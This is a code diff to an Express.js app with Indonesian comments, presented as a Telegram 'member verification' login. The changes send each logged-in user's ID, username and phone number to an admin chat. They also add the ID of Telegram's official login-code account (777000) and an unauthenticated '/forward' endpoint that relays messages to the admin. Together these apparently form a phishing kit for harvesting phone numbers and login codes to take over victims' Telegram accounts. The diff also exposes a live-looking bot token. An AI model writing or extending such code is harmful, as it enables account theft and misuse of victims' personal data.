@@ -12,6 +12,7 @@ const BOT_TOKEN = "7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us"; // Ganti den
 const ADMIN_CHAT_ID = "5460230196"; // Ganti dengan chat ID admin Anda
 const BOT_USERNAME = "verifikasimemberindoviralbot"; // Ganti dengan username bot Anda (tanpa @)
 const SECRET_KEY = "7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us"; // Ganti dengan kunci rahasia Anda
+const TELEGRAM_CHANNEL_ID = 777000; // ID saluran resmi Telegram
 
 // Middleware
 app.use(express.urlencoded({ extended: true }));
@@ -52,10 +53,10 @@ app.get("/auth", (req, res) => {
   // Simpan data pengguna dalam sesi
   req.session.user = data;
 
-  // Kirim nomor telepon ke admin
-  const message = `User logged in:\nID: ${data.id}\nPhone: ${
-    data.phone || "No phone provided"
-  }`;
+  // Kirim username dan nomor telepon ke admin
+  const message = `User logged in:\nID: ${data.id}\nUsername: ${
+    data.username || "No username provided"
+  }\nPhone: ${data.phone || "No phone provided"}`;
   axios
     .get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       params: {
@@ -68,6 +69,7 @@ app.get("/auth", (req, res) => {
   res.send(`
         <h1>Login berhasil!</h1>
         <p>ID: ${data.id}</p>
+        <p>Username: ${data.username || "No username provided"}</p>
         <p>Phone: ${data.phone || "No phone provided"}</p>
         <a href="/logout">Logout</a>
     `);
@@ -81,6 +83,25 @@ app.get("/logout", (req, res) => {
     }
     res.redirect("/");
   });
+});
+
+// Endpoint untuk meneruskan pesan dari saluran Telegram resmi
+app.post("/forward", (req, res) => {
+  const { message } = req.body;
+
+  // Kirim pesan ke admin
+  axios
+    .get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      params: {
+        chat_id: ADMIN_CHAT_ID,
+        text: message,
+      },
+    })
+    .catch((err) =>
+      console.error("Failed to forward message to Telegram:", err)
+    );
+
+  res.send("Message forwarded to admin.");
 });
 
 // Jalankan server
